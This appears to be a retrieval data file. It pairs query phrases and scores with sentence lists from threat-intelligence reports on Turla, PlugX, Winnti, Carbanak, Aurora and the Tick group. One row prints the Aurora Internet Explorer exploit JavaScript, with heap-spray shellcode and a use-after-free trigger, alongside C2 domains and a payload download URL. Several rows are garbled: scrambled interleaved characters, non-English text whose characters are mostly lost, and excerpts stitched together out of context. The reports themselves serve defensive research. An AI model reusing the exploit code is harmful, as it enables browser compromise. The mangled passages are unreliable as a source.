INIT 0x4c000 0xebc 0x1000 5.343628 .reloc 0x4d000 0x1de0 0x1e00 6.448244 Strings Interesting strings: CsrClientCallServer ExitThread LdrGetProcedureAddress ZwTerminateThread \\\\SystemRoot\\\\system32\\\\%s IoCreateDevice ModuleStart ModuleStop \\\\?', '?\\\\%s\\\\cryptoapi.dll \\\\?', '?\\\\%s\\\\inetpub.dll services.exe iexplore.exe firefox.exe opera.exe netscape.exe mozilla.exe msimn.exe outlook.exe adobeupdater.exe Sample C - inetpub.dll (Resource: 102) 7 of 34 12/31/2014 09:19 AMCIRCL TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/ Hashes Type of HashHash MD5 2145945b9b32b4ccbd498db50419b39b SHA1 690f18810b0cbef06f7b864c7585bd6ed0d207e0 SHA-256 3de0ba77fa2d8b26e4226fd28edc3ab8448434d851f6b2b268ec072c5da92ade ssdeep 3072:HPHvQByUS7Yqy7UKJm1Y3a3v/z61dmh9f3b/LAaulNA7:HPHqyUS7YqyIKH3aHz61Mh9jZulNC VirusTotal results for sample C AV product Result McAfee Generic.dx!wel K7AntiVirus Riskware Symantec Backdoor.Pfinet Norman W32/Suspicious_Gen3.UANR Avast Win32:Malware-gen eSafe Win32.TRATRAPS BitDefender Backdoor.Generic.429659 F-Secure Backdoor.Generic.429659 VIPRE Trojan.Win32.Generic!BT AntiVir TR/ATRAPS.Gen McAfee-GW-EditionGeneric.dx!wel Emsisoft Backdoor.SuspectCRC!IK Antiy-AVL Trojan/win32.agent.gen GData Backdoor.Generic.429659 AhnLab-V3 Backdoor/Win32.Pfinet PCTools Backdoor.Pfinet Ikarus Backdoor.SuspectCRC Panda Trj/CI.A Avast5 Win32:Malware-gen Scanned: 2011-07-07 04:43:10 - 43 scans - 19 detections (44.0%) File characteristics Meta data Size: 118784 bytes Type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows Date: 0x4AC5A6A4 [Fri Oct 2 07:07:16 2009 UTC] EP: 0x20013857 .text 0/5 CRC: Claimed: 0x0, Actual: 0x2cb10 [SUSPICIOUS] Sections Name VirtAddr VirtSize RawSize Entropy -------------------------------------------------------------------------------- .text 0x1000 0x12976 0x13000 6.509133 .basein 0x14000 0x97 0x1000 0.418760 [SUSPICIOUS] .rdata 0x15000 0x4ede 0x5000 7.011329 [SUSPICIOUS] .data 0x1a000 0x15f0 0x1000 5.453684 .reloc 0x1c000 0x152a 0x2000 4.423836 Exports Flags : 00000000 Time stamp : Fri Oct 2 09:07:16 2009 Version : 0.0 DLL name : CARBON.dll Ordinals base : 1.', '(00000001) # of Addresses: 2.', '(00000002) 8 of 34 12/31/2014 09:19 AMCIRCL TR-25 Analysis - Turla / Pfinet / Snake/ ... http://www.circl.lu/pub/tr-25/ # of Names : 2.', '(00000002) 1.', '00002CB9 ModuleStart 2.']"
HttpWebRequest and HttpListener from .NET Framework are used for client and server implementations|0.9148285081544792|"['They have two parameters in common: address and port (by default, 38001).', 'TcpConnector also has the parameter interval, which indicates how long to wait before trying to reconnect.', 'HttpConnector and HttpBindConnector are HTTP client with support for proxy and HTTP server.', 'Supported client parameters: url address to connect to, interval same as at TcpConnector, proxy and cred proxy server address and credentials.', 'Server parameters: url list of prefixes on which it will run and timeout client timeout.', 'The standard classes HttpWebRequest and HttpListener from .NET Framework are used for client and server implementations.', 'Both HTTP and HTTPS are supported: if no SSL certificate is configured for the port on which the server is running, it will be launched with CN = Environment.MachineName + "".local.domain"".', 'The client, in turn, ignores certificate validation.', 'RPCConnector and RPCBindConnector are classes that allow setting up a connection via a Named Pipe.', 'They take a single parameter, name, which is the name of the connection.', 'TcpBindConnector and HttpBindConnector support simultaneous connections for multiple clients.']"
TcpBindConnector and HttpBindConnector|0.7564977686858368|"['The standard classes HttpWebRequest and HttpListener from .NET Framework are used for client and server implementations.', 'Both HTTP and HTTPS are supported: if no SSL certificate is configured for the port on which the server is running, it will be launched with CN = Environment.MachineName + "".local.domain"".', 'The client, in turn, ignores certificate validation.', 'RPCConnector and RPCBindConnector are classes that allow setting up a connection via a Named Pipe.', 'They take a single parameter, name, which is the name of the connection.', 'TcpBindConnector and HttpBindConnector support simultaneous connections for multiple clients.', 'For the network connectors to work, the backdoor adds an allow rule to Windows Firewall with the name ""Core Networking IPv4"" for its executable module.', '20/41Figure 40.', 'Code for adding Windows Firewall rules Just like with Crosswalk, there are multiple levels of the protocol: in this case, transport, network, and application.', '5.2.1 Transport protocols 1.', 'TCP TCP supports three types of messages: PingMessage (0x1), PongMessage (0x2), and DataMessage (0x3).']"
dynamically loads the library|0.8136023816140918|['Contents of the archive 20200926___Request for wedding reception.exe For bait, it contains a Chinese-language Microsoft Word document with the text of a wedding banquet form.', '26/41Figure 50.', 'Bait file wedding.docx The archive contents are unpacked to the folder c:\\\\programdata, from where (besides the bait file being opened) the payload log.exe is launched.', 'Both the executable file and the DLL library are obfuscated with VMProtect, but we also found identical unprotected versions (as shown in the following screenshots).', 'An unpacked legitimate component of Bitdefender (386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd) serves as log.exe.', 'It dynamically loads the library log.dll.', 'Figure 51.', 'Loading log.dll in log.exe The library, in turn, when loaded checks for whether the current module contains a certain set of bytes at offset 0x2775.', 'If the loading module meets its expectations, these bytes change to a call instruction for a DLL function.', 'As a result, in log.exe right after log.dll loads, a call is made to the function sub_100010D0.', 'The called function is not explicitly exported.']
obfuscated with junk instructions and inverted conditional jumps (combinations of jle/jg and the like).|0.8062968149276852|['Its core is typical of PlugX, being an SFX archive (ccdb8e0162796efe19128c0bac78478fd1ff2dc3382aed0c19b0f4bd99a31efc) that contains the library mapistub.dll, which loads as a legitimate executable.', '29/41Figure 55.', 'PlugX SFX archive But mapistub.dll is only a downloader.', 'Google Docs is used to store the payload: the library sends a request to export a certain document in .txt format, decodes it into shellcode with Base64, and runs it.', 'Figure 56.', 'Loading and running shellcode in mapistub.dll The shellcode has been obfuscated with junk instructions and inverted conditional jumps (combinations of jle/jg and the like).', 'Its job is to decrypt and run the next stage, which is responsible for reflective loading of the main PlugX component and passing the structure with the configuration to it.', 'Figure 57.', 'Obfuscated shellcode from Google Docs This process and what the similar sample does after that are described in more detail in a report from Dr.Web (QuickHeal shellcode and BackDoor.PlugX.28).', 'Besides the C2 servers in the configuration file, 103.79.76[.', ']205 and ns.mircosoftbox[.']
the file is deleted|0.8295144481051888|['The intrusion outlined in this report discusses a case that presented substantial challenges due to: 1 Krebs; Krebs on Security Posts Tagged: Carbanak; https://krebsonsecurity.com/tag/carbanak/ 2 Schwartz; Sophisticated Carbanak Banking Malware Returns, With Upgrades; https://www.bankinfosecurity.com/sophisticated-carbanak-banking-malware-returns- upgrades-a-8523 3 Krebs; Payments Giant Verifone Investigating Breach; https://krebsonsecurity.com/2017/03/payments-giant-verifone-investigating-breach/ 4 Krebs; Hyatt Hotels Suffers 2nd Card Breach in 2 Years; https://krebsonsecurity.com/2017/10/hyatt-hotels-suffers-2nd-card-breach-in-2-years/ 5 Miller, Nuce, Vengerik; FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings; 2 https://www.fireeye.com/blog/threat-research/2017/03/fin7_spear_phishing.htmlWHITE PAPER The initial intrusion vector Unique attacker toolset The attacker dwell time The large, heterogeneous environment The speed with which the attackers gained administrative access The forensic mindfulness of the CARBANAK attackers The toolset utilized by the attackers was a mix of custom tools, freely !', 'The!Shadows!of!Ghosts!', 'available code, and open source software utilities.', 'RSA I!R researcChaesde!', 'aSltlu 3dy2: !oCfA RBANAK!', '!', 'the malicious files in the CARBANAK toolset using various publicly available The toolasentd u otpileizne ds obuyr cthee r easttoaucrkceerss.', 'wSiaxs o af tmhiex toofo clus sutsoemd tino otlhsi,s f irneterluy saiovani lwabelree cfooduen da nd open Deleted: , source stoof thwaavree buetielinti eusp.l oRaSdAe IdR t ore as epaurbchliecldy aalvl a3i2la obfl eth aen tmivailriuciso uasg gfirleegs ainti othne s iCteA.R OBfA NAK Deleted: toolset using various publicly available and open source resources.', 'Six of the tools used in this these six, five of them have little to no detection or indication of malice from Deleted: Open intrusion were found to have been uploaded to a publicly available antivirus aggregation site.', 'Of these sixa,n ftiivveir oufs tvheenmd ohrasv.', 'eT hlitistl eo btose nrov adteiotenc etixopnl aoirn isn tdhicea rtieoans oonf mthaalitc teh fer ocmlie annttsiv irus vendors.']
the file is deleted|0.9385955340348096|"['This vulnerability can be leveraged by attackers of varying skill levels due to the public availability of the Metasploit module ie_aurora.rb .', 'The exploit code used by the original attackers was quickly improved and added to Metasploit thus greatly expanding the potential number of attackers and reliability of code.', 'The JavaScript performs a heap spray attack and injects the embedded shellcode described below.', 'The JavaScript exploits the vulnerability in Internet Explorer by copying, releasing, and then referencing a Document Object Model (DOM) element.', 'Javascript Exploit Code <html> <head> <script> var sc = unescape(""%u9090%u19eb%u4b5b%u3390%u90c9%u7b80%ue901%u0175%u66c3%u7bb9%u8004%u0b34%ue2d8%uebfa%ue805%uffe2%uffff%u3931%ud8db%u87 d8%u79bc%ud8e8%ud8d8%u9853%u53d4%uc4a8%u5375%ud0b0%u2f53%ud7b2%u3081%udb59%ud8d8%u3a48%ub020%ueaeb%ud8d8%u8db0%ubdab%u8caa%u9e53 %u30d4%uda37%ud8d8%u3053%ud9b2%u308 SECTION REMOVED FOR SPACE... 8%udfa7%ufa4a%uc6a8%ubc7c%u4b37%u3cea%u564c%ud2cb%ua174%u3ee1%u1c40%uc755%u8fac%ud5be%u9b27%u7466%u4003%uc8d2%u5820%u770e%u2342% ucd8b%ub0be%uacac%ue2a8%uf7f7%ubdbc%ub7b5%uf6e9%uacbe%ub9a8%ubbbb%uabbd%uf6ab%ubbbb%ubcf7%ub5bd%uf7b7%ubcb9%ub2f6%ubfa8%u00d8""); var sss = Array (826, 679, 798, 224, 770, 427, 819, 770, 707, 805, 693, 679, 784, 707, 280, 238, 259, 819, 336, 693, 336, 700, 259, 819, 336, 693, 336, 700, 238, 287, 413, 224, 833, SECTION REMOVED FOR SPACE... 735, 427, 336, 413, 735, 420, 350, 336, 336, 413, 735, 301, 301, 287, 224, 861, 840, 637, 735, 651, 427, 770, 301, 805, 693, 413, 875); var arr = new Array; for (var i = 0; i < sss.length; i ++) { arr[i] = String.fromCharCode (sss [i] / 7); } var cc = arr.toString (); cc = cc.replace (/,/g, """"); cc = cc.replace (/@/g, "",""); eval (cc); var x1 = new Array (); for (i = 0; i < 200; i ++) { x1 [i] = document.createElement (""COMMENT""); x1 [i].data = ""abc""; }; var e1 = null; function ev1 (evt) { e1 = document.createEventObject (evt); document.getElementById (""sp1"").innerHTML = """"; window.setInterval (ev2, 50); } function ev2 () { p = ""\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u 0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d""; for (i = 0; i < x1.length; i ++) { x1 [i].data = p; }; var t = e1.srcElement; } </script> </head> <body> <span id=""sp1""><IMG SRC=""aaa.gif"" onload=""ev1(event)"" width=""16"" height=""16""></span> </body> </html> JavaScript Artifacts Pattern Initial encrypted dropper download.', 'Deleted file.', 'C:\\\\%appdata%\\\\a.exe Decrypted dropper.', 'Deleted file.', 'C:\\\\%appdata\\\\b.exe JavaScript present in Internet Explorer memory space.', '<code listed above> Download URL present in internet history during memory http://demo1.ftpaccess.cc/demo/ad.jpg analysis.', 'Other domains associated with Aurora.']"
using the API RegisterServiceHandlerA then SetServiceStatus, and finally CreateEventA.|0.8120829645866956|"['The dll is run using the command rundll32.exe SuperFrtch.dll, #1.', 'The export function has the name WwanSvcMain.', 'https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ 6/199/15/21, 3:20 PM Operation Harvest: A Deep Dive into a Long-term Campaign | McAfee Blogs The model uses the persistence technique utilizing svchost.exe with service.dll to install a rogue service.', 'It appears that the dll employs several mechanisms to fingerprint the targeted system and avoid analysis in the sandbox, making analysis more difficult.', 'The DLL embeds several obfuscated strings decoded when running.', 'Once the fingerprinting has been done, the malware will install the malicious service using the API RegisterServiceHandlerA then SetServiceStatus, and finally CreateEventA.', 'A description of the technique can be found here.', 'The malware also decrypts and injects the payload in memory.', 'The following screenshot shows the routine decryption.', 'Figure 4 Decryption routine When we analyzed this unique routine, we discovered similarities and the mention of it in a publication that can be read here.', 'The malware described in the article is attributed to the Winnti malware family.']"
injects the payload in memory.|0.7692161105861324|"['https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ 6/199/15/21, 3:20 PM Operation Harvest: A Deep Dive into a Long-term Campaign | McAfee Blogs The model uses the persistence technique utilizing svchost.exe with service.dll to install a rogue service.', 'It appears that the dll employs several mechanisms to fingerprint the targeted system and avoid analysis in the sandbox, making analysis more difficult.', 'The DLL embeds several obfuscated strings decoded when running.', 'Once the fingerprinting has been done, the malware will install the malicious service using the API RegisterServiceHandlerA then SetServiceStatus, and finally CreateEventA.', 'A description of the technique can be found here.', 'The malware also decrypts and injects the payload in memory.', 'The following screenshot shows the routine decryption.', 'Figure 4 Decryption routine When we analyzed this unique routine, we discovered similarities and the mention of it in a publication that can be read here.', 'The malware described in the article is attributed to the Winnti malware family.', 'The operating method and the code used in the DLL described in the article are very similar to our analysis and observations.', 'The process dump also revealed further indicators.']"
The malware was injected into a SVCHOST process where a driver location pointed to the config file|0.9999999999999997|"['A redacted snippet of the code would look like this: https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ 7/199/15/21, 3:20 PM Operation Harvest: A Deep Dive into a Long-term Campaign | McAfee Blogs Creating archive ***.rar Adding [data from location] 0% OK Another indicator of discovering Winnti malware was the following execution path we discovered in the command line dump of the memory: cmd /c klcsngtgui.exe 1560413F7E <abbreviation-victim>.dat What we observed here was the use of a valid executable, the AES 256 decryption key of the payload (.dat file).', 'In this case, the payload file was named using an abbreviation of the victim companys name.', 'Unfortunately, the adversary had removed the payload file from the system.', 'File carving did not work since the disk/unallocated space was overwritten.', 'However, reconstructing traces from memory revealed that we were dealing with the Winnti 4.0 malware.', 'The malware was injected into a SVCHOST process where a driver location pointed to the config file.', 'We observed in the process dump the exfiltration of data on the system, such as OS, Processor (architecture), Domain, Username, etc.', 'Another clue that helped us was the use of DNS tunneling by Winnti which we discovered traces of in memory.', 'The hardcoded 208.67.222.222 resolves to a legitimate OpenDNS DNS server.', 'The IP is pushed into the list generated by the malware at runtime.', 'At the start of the malware, it populates the list with the systems DNS, and the OpenDNS server is only used as a backup to ensure that the C2 domain is resolved.']"
the adversary had removed the payload file from the system.|0.8797533817526539|"['Firstly, it revealed artifacts related to the DLL analyzed, C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\SuperfRtch\\\\SuperfRtch.dat.', 'We believe that this dat file might be the loaded payload.', 'Secondly, while investigating the process dump, we observed activities from the backdoor that are part of the data exfiltration attempts which we will describe in more detail in this analysis report.', 'A redacted snippet of the code would look like this: https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ 7/199/15/21, 3:20 PM Operation Harvest: A Deep Dive into a Long-term Campaign | McAfee Blogs Creating archive ***.rar Adding [data from location] 0% OK Another indicator of discovering Winnti malware was the following execution path we discovered in the command line dump of the memory: cmd /c klcsngtgui.exe 1560413F7E <abbreviation-victim>.dat What we observed here was the use of a valid executable, the AES 256 decryption key of the payload (.dat file).', 'In this case, the payload file was named using an abbreviation of the victim companys name.', 'Unfortunately, the adversary had removed the payload file from the system.', 'File carving did not work since the disk/unallocated space was overwritten.', 'However, reconstructing traces from memory revealed that we were dealing with the Winnti 4.0 malware.', 'The malware was injected into a SVCHOST process where a driver location pointed to the config file.', 'We observed in the process dump the exfiltration of data on the system, such as OS, Processor (architecture), Domain, Username, etc.', 'Another clue that helped us was the use of DNS tunneling by Winnti which we discovered traces of in memory.']"
When the executable is run, the DLL next to it is loaded.|1.0|"['The adversary used either the standalone version or distributed three files on different assets in the network to gain remote control of those assets.', 'The samples discovered and analyzed were communicating towards two domains.', 'Both domains were registered during the time of the campaign.', 'One of the PlugX samples consisted of the following three parts: Filename Hashes HPCustPartic.exe SHA256: 8857232077b4b0f0e4a2c3bb5717fd65079209784f41694f8e1b469e34754cf6 HPCustPartUI.dll SHA256: 0ee5b19ea38bb52d8ba4c7f05fa1ddf95a4f9c2c93b05aa887c5854653248560 HPCustPartic.bin SHA256: 008f7b98c2453507c45dacd4a7a7c1b372b5fafc9945db214c622c8d21d29775 The .exe file is a valid and signed executable and, in this case, an executable from HP (HP Customer participation).', 'We also observed other valid executables being used, ranging from AV vendors to video software.', 'When the executable is run, the DLL next to it is loaded.', 'The DLL is valid but contains a small hook towards the payload which, in our case, is the .bin file.', 'The DLL loads the PlugX config and injects it into a process.', 'We executed the samples in a test setup and dumped the memory of the machine to conduct memory analysis with volatility.', 'After the basic forensically sound steps, we ran the malfind plugin to detect possible injected code in a process.', 'From the redacted output of the plugin, we observed the following values for the process with possible injected code: https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ 4/199/15/21, 3:20 PM Operation Harvest: A Deep Dive into a Long-term Campaign | McAfee Blogs Process: svchost.exe Pid: 860 Address: 0xb50000 Process: explorer.exe Pid: 2752 Address: 0x56a000 Process: svchost.exe Pid: 1176 Address: 0x80000 Process: svchost.exe Pid: 1176 Address: 0x190000 Process: rundll32.exe Pid: 3784 Address: 0xd0000 Process: rundll32.exe Pid: 3784 Address: 0x220000 One observation is the mention of the SVCHOST process with a ProcessID value of 1176 that is mentioned twice but with different addresses.']"
The DLL embeds several obfuscated strings|0.8265800914437618|"['The name of the created service, SysmainUpdate, is usurping the name of the legitimate service SysMain which is related to the legitimate DLL sysmain.dll and also to the Superfetch service.', 'The dll is run using the command rundll32.exe SuperFrtch.dll, #1.', 'The export function has the name WwanSvcMain.', 'https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ 6/199/15/21, 3:20 PM Operation Harvest: A Deep Dive into a Long-term Campaign | McAfee Blogs The model uses the persistence technique utilizing svchost.exe with service.dll to install a rogue service.', 'It appears that the dll employs several mechanisms to fingerprint the targeted system and avoid analysis in the sandbox, making analysis more difficult.', 'The DLL embeds several obfuscated strings decoded when running.', 'Once the fingerprinting has been done, the malware will install the malicious service using the API RegisterServiceHandlerA then SetServiceStatus, and finally CreateEventA.', 'A description of the technique can be found here.', 'The malware also decrypts and injects the payload in memory.', 'The following screenshot shows the routine decryption.', 'Figure 4 Decryption routine When we analyzed this unique routine, we discovered similarities and the mention of it in a publication that can be read here.']"
The DLL is used to create a malicious service|0.883711119908621|"['Also, the rule was triggered on PID 3784, which belonged to RUNDLL32.exe.', 'Investigating the dumps after dynamic analysis, we observed two domain names used for C2 traffic: brushupdata.com brushupdata.com https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ 5/199/15/21, 3:20 PM Operation Harvest: A Deep Dive into a Long-term Campaign | McAfee Blogs In particular, we saw the following hardcoded value that might be another payload being downloaded: sery.brushupdata.com/CE1BC21B4340FEC2B8663B69 The PlugX families we observed used DNS [T1071.001] [T1071.004] as the transport channel for C2 traffic, in particular TXT queries.', 'Investigating the traffic from our samples, we observed the check-in-signature (20 2A 2F 2A 0D) that is typical for PlugX network traffic: 00000000: 47 45 54 20 2F 42 34 42 42 44 43 43 30 32 39 45 00000010: 31 31 39 37 31 39 46 30 36 35 36 32 32 20 48 54 00000020: 54 50 2F 31 2E 31 0D 0A 41 63 63 65 70 74 3A 20 00000030: 2A 2F 2A 0D 0A 43 6F 6F 6B 69 65 3A 20 44 36 43 00000040: 57 50 2B 56 5A 47 6D 59 6B 6D 64 6D 64 64 58 55 00000050: 71 58 4D 31 71 31 6A 41 3D 0D 0A 55 73 65 72 2D During our analysis of the different PlugX samples discovered, the domain names as mentioned above stayed the same, though the payload values were different.', 'For example: hxxp://sery.brushupdata.com/B4BBDCC029E119719F065622 hxxp://sery.brushupdata.com/07FDB1B97D22EE6AF2482B1B hxxp://sery.brushupdata.com/273CDC0B9C6218BC1187556D Other PlugX samples we observed injected themselves into Windows Media Player and started a connection with the following two domains: asmlbigip.com asmlbigip.com Hello Winnti Another mechanism observed was to start a program as a service [T1543.003] on the Operating System with the acquired System rights by using the *Potato tools.', 'The file the adversary was using seemed to be a backdoor that was using the DLL file format (2458562ca2f6fabddae8385cb817c172).', 'The DLL is used to create a malicious service and its name is service.dll.', 'The name of the created service, SysmainUpdate, is usurping the name of the legitimate service SysMain which is related to the legitimate DLL sysmain.dll and also to the Superfetch service.', 'The dll is run using the command rundll32.exe SuperFrtch.dll, #1.', 'The export function has the name WwanSvcMain.', 'https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ 6/199/15/21, 3:20 PM Operation Harvest: A Deep Dive into a Long-term Campaign | McAfee Blogs The model uses the persistence technique utilizing svchost.exe with service.dll to install a rogue service.', 'It appears that the dll employs several mechanisms to fingerprint the targeted system and avoid analysis in the sandbox, making analysis more difficult.']"
. The name of the created service, “SysmainUpdate”, is usurping the name of the legitimate service “SysMain” which is related to the legitimate DLL sysmain.dll and also to the Superfetch service.|1.0|"['Investigating the dumps after dynamic analysis, we observed two domain names used for C2 traffic: brushupdata.com brushupdata.com https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ 5/199/15/21, 3:20 PM Operation Harvest: A Deep Dive into a Long-term Campaign | McAfee Blogs In particular, we saw the following hardcoded value that might be another payload being downloaded: sery.brushupdata.com/CE1BC21B4340FEC2B8663B69 The PlugX families we observed used DNS [T1071.001] [T1071.004] as the transport channel for C2 traffic, in particular TXT queries.', 'Investigating the traffic from our samples, we observed the check-in-signature (20 2A 2F 2A 0D) that is typical for PlugX network traffic: 00000000: 47 45 54 20 2F 42 34 42 42 44 43 43 30 32 39 45 00000010: 31 31 39 37 31 39 46 30 36 35 36 32 32 20 48 54 00000020: 54 50 2F 31 2E 31 0D 0A 41 63 63 65 70 74 3A 20 00000030: 2A 2F 2A 0D 0A 43 6F 6F 6B 69 65 3A 20 44 36 43 00000040: 57 50 2B 56 5A 47 6D 59 6B 6D 64 6D 64 64 58 55 00000050: 71 58 4D 31 71 31 6A 41 3D 0D 0A 55 73 65 72 2D During our analysis of the different PlugX samples discovered, the domain names as mentioned above stayed the same, though the payload values were different.', 'For example: hxxp://sery.brushupdata.com/B4BBDCC029E119719F065622 hxxp://sery.brushupdata.com/07FDB1B97D22EE6AF2482B1B hxxp://sery.brushupdata.com/273CDC0B9C6218BC1187556D Other PlugX samples we observed injected themselves into Windows Media Player and started a connection with the following two domains: asmlbigip.com asmlbigip.com Hello Winnti Another mechanism observed was to start a program as a service [T1543.003] on the Operating System with the acquired System rights by using the *Potato tools.', 'The file the adversary was using seemed to be a backdoor that was using the DLL file format (2458562ca2f6fabddae8385cb817c172).', 'The DLL is used to create a malicious service and its name is service.dll.', 'The name of the created service, SysmainUpdate, is usurping the name of the legitimate service SysMain which is related to the legitimate DLL sysmain.dll and also to the Superfetch service.', 'The dll is run using the command rundll32.exe SuperFrtch.dll, #1.', 'The export function has the name WwanSvcMain.', 'https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ 6/199/15/21, 3:20 PM Operation Harvest: A Deep Dive into a Long-term Campaign | McAfee Blogs The model uses the persistence technique utilizing svchost.exe with service.dll to install a rogue service.', 'It appears that the dll employs several mechanisms to fingerprint the targeted system and avoid analysis in the sandbox, making analysis more difficult.', 'The DLL embeds several obfuscated strings decoded when running.']"
the data was stored in a location in the Internet Information Services (IIS) web server and exfiltrated over HTTP using GET requests towards the exact file paths|0.7723193494455062|"['With high confidence, we believe that the adversary was interested in stealing proprietary intelligence that could be used for military or intellectual property/manufacturing purposes.', 'The adversary used several techniques to exfiltrate the data.', 'In some cases, batch (.bat) scripts were created to gather information from certain network shares/folders and use the rar tool to compress them to a certain size [T1020] [T1030].', 'Example of content in a batch script: C:\\\\Windows\\\\web\\\\rar.exe a -[redacted] -r -v50000 [Target-directory] On other occasions, manual variants of the above command were discovered after using the custom backdoor as described earlier.', 'When the data was gathered on a local system using the backdoor, the files were exfiltrated over the backdoor and the rar files were deleted [T1070.004].', 'Where external facing assets were used, like a web server, the data was stored in a location in the Internet Information Services (IIS) web server and exfiltrated over HTTP using GET requests towards the exact file paths [T1041] [T1567] [T1071].', 'An example of the [redacted] web traffic in the IIS logfiles: https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/operation-harvest-a-deep-dive-into-a-long-term-campaign/ 9/199/15/21, 3:20 PM Operation Harvest: A Deep Dive into a Long-term Campaign | McAfee Blogs Date /Time Request TCP Src port Source IP User-Agent Redacted GET /****/[redacted].rar 80 180.50.*.', '* MINIXL redacted GET /****/[redacted].rar 80 209.58.*.', '* MINIXL The source IP addresses discovered belonged to two different ISP/VPN providers based in Hong-Kong.', 'The User-Agent value is an interesting one, MINIXL.', 'When we researched that value, we discovered a blog from Dell SecureWorks from 2015 that mentions the same User- Agent, but also a lot of the artifacts mentioned from the blog overlapped with the observations and TTPs of Operation Harvest [link].']"
HTTP traffic to C2|0.7530161152897807|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
and lateral movement/execution of files|0.7892007231364451|['2013   CVE-2013-0633 CVE- 2013-0634 (Ladyboyle)1.23 2016 4 (Symantec)   (Tick) 4,  11  LAC   .5 2017 6 (SecureWorks) (Bronze Butler)6   ,  7 7 11 8  .', '2018 6  42   USB  .9 2014      .', '2008         .', 'IT   .', ',    USB    .', '.', '.', '1 https://www.symantec.com/connect/blogs/adobe-zero-day-used-ladyboyle-attack 2 https://www.fireeye.com/blog/threat-research/2013/02/lady-boyle-comes-to-town-with-a-new-exploit.html 3 https://asec.ahnlab.com/912 4 https://www.symantec.com/connect/blogs/tick-cyberespionage-group-zeros-japan 5 https://www.lac.co.jp/english/report/2016/11/04_cgview_01.html 6 https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses 7 https://unit42.paloaltonetworks.com/unit42-tick-group-continues-attacks/ 8 https://blog.trendmicro.com/trendlabs-security-intelligence/redbaldknight-bronze-butler-daserf-backdoor-now-using- steganography/ 9 https://unit42.paloaltonetworks.com/unit42-tick-group-weaponized-secure-usb-drives-target-air-gapped-critical-systems/ AhnLab, Inc. All rights reserved.', '3Analysis Report_Tick Group    2014    .', ',    , , , , ,  , IT     .', ',  MS  ,   .']
and lateral movement/execution of files|0.7892007231364451|['The intrusion outlined in this report discusses a case that presented substantial challenges due to: 1 Krebs; Krebs on Security Posts Tagged: Carbanak; https://krebsonsecurity.com/tag/carbanak/ 2 Schwartz; Sophisticated Carbanak Banking Malware Returns, With Upgrades; https://www.bankinfosecurity.com/sophisticated-carbanak-banking-malware-returns- upgrades-a-8523 3 Krebs; Payments Giant Verifone Investigating Breach; https://krebsonsecurity.com/2017/03/payments-giant-verifone-investigating-breach/ 4 Krebs; Hyatt Hotels Suffers 2nd Card Breach in 2 Years; https://krebsonsecurity.com/2017/10/hyatt-hotels-suffers-2nd-card-breach-in-2-years/ 5 Miller, Nuce, Vengerik; FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings; 2 https://www.fireeye.com/blog/threat-research/2017/03/fin7_spear_phishing.htmlWHITE PAPER The initial intrusion vector Unique attacker toolset The attacker dwell time The large, heterogeneous environment The speed with which the attackers gained administrative access The forensic mindfulness of the CARBANAK attackers The toolset utilized by the attackers was a mix of custom tools, freely !', 'The!Shadows!of!Ghosts!', 'available code, and open source software utilities.', 'RSA I!R researcChaesde!', 'aSltlu 3dy2: !oCfA RBANAK!', '!', 'the malicious files in the CARBANAK toolset using various publicly available The toolasentd u otpileizne ds obuyr cthee r easttoaucrkceerss.', 'wSiaxs o af tmhiex toofo clus sutsoemd tino otlhsi,s f irneterluy saiovani lwabelree cfooduen da nd open Deleted: , source stoof thwaavree buetielinti eusp.l oRaSdAe IdR t ore as epaurbchliecldy aalvl a3i2la obfl eth aen tmivailriuciso uasg gfirleegs ainti othne s iCteA.R OBfA NAK Deleted: toolset using various publicly available and open source resources.', 'Six of the tools used in this these six, five of them have little to no detection or indication of malice from Deleted: Open intrusion were found to have been uploaded to a publicly available antivirus aggregation site.', 'Of these sixa,n ftiivveir oufs tvheenmd ohrasv.', 'eT hlitistl eo btose nrov adteiotenc etixopnl aoirn isn tdhicea rtieoans oonf mthaalitc teh fer ocmlie annttsiv irus vendors.']
